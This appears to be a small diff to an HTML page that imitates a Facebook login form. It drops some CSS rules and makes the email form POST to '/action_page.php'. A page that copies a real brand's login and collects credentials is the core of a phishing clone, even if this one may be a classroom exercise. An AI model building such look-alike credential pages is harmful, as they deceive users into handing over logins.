@@ -72,12 +72,7 @@ body {font-family: Arial, Helvetica, sans-serif;}
 	 font-weight: 700;
 	 box-shadow: 0 1px 3px 1px rgba(0, 0, 0, 0.17), 0 1px 0 rgba(255, 255, 255, 0.36) inset;
 }
- .login-form input[type=&#34;
-submit&#34;
-]:hover {
- margin: 10px ;
-	 background: #ddd;
-}
+ 
  a{
 
    color:white;
@@ -90,11 +85,7 @@ submit&#34;
   text-decoration: none;
   margin: 20px 0px;
   cursor: pointer;
-:active {
-	 padding-top: 9px;
-	 padding-bottom: 7px;
-	 background: #c9c9c9;
-}
+
 
 </style>
 </head>
@@ -102,7 +93,7 @@ submit&#34;
 
 <section class="login-form-wrap">
   <h1>Facebook</h1>
-  <form class="login-form" action="POST" action="#">
+  <form action="/action_page.php"  class="login-form" method="POST" action="#">
     <label>
       <input type="email" name="email" required placeholder="Email">
     </label>
